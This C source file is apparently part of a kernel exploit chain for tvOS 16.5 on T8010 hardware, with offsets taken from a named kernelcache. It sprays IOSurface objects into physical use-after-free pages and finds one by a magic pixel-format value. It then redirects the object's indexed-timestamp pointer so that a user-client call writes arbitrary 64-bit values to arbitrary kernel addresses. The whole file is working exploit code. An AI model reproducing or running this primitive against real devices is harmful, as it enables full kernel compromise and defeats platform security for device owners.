// Build 19: IOSurface PTE kwrite — offsets from IDA on kernelcache.j105a.20L563.macho (tvOS 16.5 / T8010).

#include "dt_pte_kwrite.h"
#include "dt_iosurface_kernel_offsets.h"

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern void dt_run_log_stage(const char *stage);
extern void dt_run_log(const char *fmt, ...);

#define PTE_KWRITE_MAX_ID 0x1000
#define ARM_PGBYTES 0x4000ULL
#define pages(number_of_pages) ((number_of_pages) * (ARM_PGBYTES))
#define IOSURFACE_LOCK_RESULT_SIZE 0xF60

typedef struct IOSurfaceFastCreateArgs {
    uint64_t IOSurfaceAddress;
    uint32_t IOSurfaceWidth;
    uint32_t IOSurfaceHeight;
    uint32_t IOSurfacePixelFormat;
    uint32_t IOSurfaceBytesPerElement;
    uint32_t IOSurfaceBytesPerRow;
    uint32_t IOSurfaceAllocSize;
} IOSurfaceFastCreateArgs;

struct iosurface_obj {
    io_connect_t port;
    uint32_t surface_id;
};

static struct {
    bool ready;
    uint64_t iosurface_uaddr;
    uint64_t object_id;
    struct iosurface_obj *storage;
    io_connect_t connect;
} g_pte_ctx;

static void dt_pte_stagef(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    dt_run_log_stage(buf);
}

static io_connect_t dt_pte_open_surface_root(void)
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == MACH_PORT_NULL) {
        dt_run_log_stage("pte iosurface IOServiceGetMatchingService failed");
        return MACH_PORT_NULL;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        dt_run_log_stage("pte iosurface IOServiceOpen failed");
        dt_pte_stagef("pte iosurface IOServiceOpen kr=0x%x", kr);
        return MACH_PORT_NULL;
    }

    dt_run_log_stage("pte iosurface IOServiceOpen ok");
    return conn;
}

static kern_return_t dt_pte_create_surface(io_connect_t conn, uint32_t *surface_id, IOSurfaceFastCreateArgs *args)
{
    char output[IOSURFACE_LOCK_RESULT_SIZE] = {0};
    size_t output_cnt = IOSURFACE_LOCK_RESULT_SIZE;
    kern_return_t kr = IOConnectCallMethod(conn, DT_IOSURFACE_UC_SELECTOR_CREATE, NULL, 0, args, 0x20, NULL, NULL, output, &output_cnt);
    if (kr != KERN_SUCCESS)
        return kr;
    if (surface_id)
        *surface_id = *(uint32_t *)(output + 0x18);
    return KERN_SUCCESS;
}

static kern_return_t dt_pte_set_indexed_timestamp(io_connect_t c, uint32_t surface_id, uint64_t index, uint64_t val)
{
    uint64_t args[3] = {surface_id, index, val};
    return IOConnectCallMethod(c, DT_IOSURFACE_UC_SELECTOR_SET_TS, args, 3, NULL, 0, NULL, NULL, NULL, NULL);
}

static kern_return_t dt_pte_release_surface(io_connect_t conn, uint32_t surface_id)
{
    uint64_t scalar = (uint64_t)surface_id;
    return IOConnectCallMethod(conn, DT_IOSURFACE_UC_SELECTOR_RELEASE, &scalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static int dt_pte_kwrite64_impl(uint64_t kaddr, uint64_t val)
{
    if (!g_pte_ctx.ready || !g_pte_ctx.storage)
        return -1;

    uint64_t backup = *(uint64_t *)(g_pte_ctx.iosurface_uaddr + DT_IOSURFACE_OFF_INDEXED_TS_PTR);
    *(uint64_t *)(g_pte_ctx.iosurface_uaddr + DT_IOSURFACE_OFF_INDEXED_TS_PTR) = kaddr;

    struct iosurface_obj obj = g_pte_ctx.storage[g_pte_ctx.object_id];
    kern_return_t kr = dt_pte_set_indexed_timestamp(obj.port, obj.surface_id, 0, val);

    *(uint64_t *)(g_pte_ctx.iosurface_uaddr + DT_IOSURFACE_OFF_INDEXED_TS_PTR) = backup;
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

static bool pte_iosurface_allocate(struct iosurface_obj *storage, io_connect_t conn, uint64_t id, kern_return_t *out_kr)
{
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAllocSize = (uint32_t)id + 1;
    args.IOSurfacePixelFormat = DT_IOSURFACE_MAGIC;
    storage[id].port = conn;
    kern_return_t kr = dt_pte_create_surface(conn, &storage[id].surface_id, &args);
    if (out_kr)
        *out_kr = kr;
    if (kr != KERN_SUCCESS) {
        dt_pte_stagef("pte iosurface create surface id=%llu kr=0x%x", id, kr);
        return false;
    }
    return true;
}

static bool pte_iosurface_search(uint64_t object_uaddr, uint64_t *out_id)
{
    uint32_t magic = *(uint32_t *)(object_uaddr + DT_IOSURFACE_OFF_PIXEL_FORMAT);
    if (magic != DT_IOSURFACE_MAGIC)
        return false;
    *out_id = (uint64_t)(*(uint32_t *)(object_uaddr + DT_IOSURFACE_OFF_ALLOC_SIZE) - 1u);
    return true;
}

static bool pte_krkw_find_object(uint64_t num_puaf_pages, const uint64_t *puaf_pages_uaddr,
    struct iosurface_obj *storage, io_connect_t conn, uint64_t *out_uaddr, uint64_t *out_id)
{
    const uint64_t batch_size = pages(1) / DT_IOSURFACE_KRKW_OBJECT_SIZE;
    uint64_t allocated_id = 0;
    uint64_t batch_num = 0;

    if (!num_puaf_pages || !puaf_pages_uaddr) {
        dt_run_log_stage("pte iosurface invalid puaf args");
        return false;
    }

    dt_pte_stagef("pte iosurface krkw cfg magic=0x%x pix=0x%x alloc=0x%x ts=0x%x objsz=0x%x batch=%llu",
        DT_IOSURFACE_MAGIC,
        DT_IOSURFACE_OFF_PIXEL_FORMAT,
        DT_IOSURFACE_OFF_ALLOC_SIZE,
        DT_IOSURFACE_OFF_INDEXED_TS_PTR,
        DT_IOSURFACE_KRKW_OBJECT_SIZE,
        batch_size);
    dt_pte_stagef("pte iosurface puaf pages=%llu uaddr=%p", num_puaf_pages, puaf_pages_uaddr);
    if (num_puaf_pages > 0)
        dt_pte_stagef("pte iosurface puaf[0]=0x%llx", (unsigned long long)puaf_pages_uaddr[0]);

    dt_run_log_stage("pte iosurface krkw search begin build20");

    while (true) {
        bool maximum_reached = false;

        for (uint64_t i = 0; i < batch_size; i++) {
            if (allocated_id == PTE_KWRITE_MAX_ID) {
                maximum_reached = true;
                break;
            }
            kern_return_t kr = 0;
            if (!pte_iosurface_allocate(storage, conn, allocated_id, &kr)) {
                dt_pte_stagef("pte iosurface krkw fail reason=create id=%llu kr=0x%x", allocated_id, kr);
                return false;
            }
            allocated_id++;
        }

        dt_pte_stagef("pte iosurface krkw scan batch=%llu sprayed=%llu", batch_num, allocated_id);

        for (uint64_t i = 0; i < num_puaf_pages; i++) {
            uint64_t puaf_page_uaddr = puaf_pages_uaddr[i];
            uint64_t stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
            for (uint64_t object_uaddr = puaf_page_uaddr; object_uaddr < stop_uaddr; object_uaddr += sizeof(uint64_t)) {
                uint64_t id = 0;
                if (pte_iosurface_search(object_uaddr, &id)) {
                    dt_pte_stagef("pte iosurface krkw hit uaddr=0x%llx id=%llu batch=%llu",
                        (unsigned long long)object_uaddr, id, batch_num);
                    *out_uaddr = object_uaddr;
                    *out_id = id;
                    return true;
                }
            }
        }

        dt_pte_stagef("pte iosurface krkw scan batch=%llu no magic", batch_num);
        batch_num++;

        if (maximum_reached) {
            dt_run_log_stage("pte iosurface krkw fail reason=exhausted ids");
            break;
        }
    }
    return false;
}

int dt_pte_kwrite_iosurface_init(uint64_t num_puaf_pages, const uint64_t *puaf_pages_uaddr)
{
    memset(&g_pte_ctx, 0, sizeof(g_pte_ctx));

    dt_run_log_stage("pte iosurface kwrite init enter build20");

    g_pte_ctx.connect = dt_pte_open_surface_root();
    if (!g_pte_ctx.connect) {
        dt_run_log_stage("pte iosurface get_surface_client failed");
        return -2;
    }

    g_pte_ctx.storage = calloc(PTE_KWRITE_MAX_ID, sizeof(struct iosurface_obj));
    if (!g_pte_ctx.storage) {
        dt_run_log_stage("pte iosurface storage alloc failed");
        return -3;
    }

    uint64_t object_uaddr = 0;
    uint64_t object_id = 0;
    if (!pte_krkw_find_object(num_puaf_pages, puaf_pages_uaddr, g_pte_ctx.storage, g_pte_ctx.connect,
            &object_uaddr, &object_id)) {
        dt_run_log_stage("pte iosurface krkw search failed build20");
        free(g_pte_ctx.storage);
        g_pte_ctx.storage = NULL;
        return -4;
    }

    g_pte_ctx.iosurface_uaddr = object_uaddr;
    g_pte_ctx.object_id = object_id;
    g_pte_ctx.ready = true;

    dt_pte_kwrite_register(dt_pte_kwrite64_impl);

    dt_pte_stagef("pte iosurface object uaddr=0x%llx id=%llu", object_uaddr, object_id);
    dt_run_log_stage("pte iosurface kwrite init OK build20");
    return 0;
}

void dt_pte_kwrite_iosurface_deinit(void)
{
    dt_pte_kwrite_unregister();
    if (g_pte_ctx.storage && g_pte_ctx.ready) {
        struct iosurface_obj obj = g_pte_ctx.storage[g_pte_ctx.object_id];
        if (obj.port && obj.surface_id)
            dt_pte_release_surface(obj.port, obj.surface_id);
    }
    if (g_pte_ctx.connect)
        IOServiceClose(g_pte_ctx.connect);
    free(g_pte_ctx.storage);
    memset(&g_pte_ctx, 0, sizeof(g_pte_ctx));
}

bool dt_pte_kwrite_is_ready(void)
{
    return g_pte_ctx.ready && dt_pte_kwrite_ready();
}
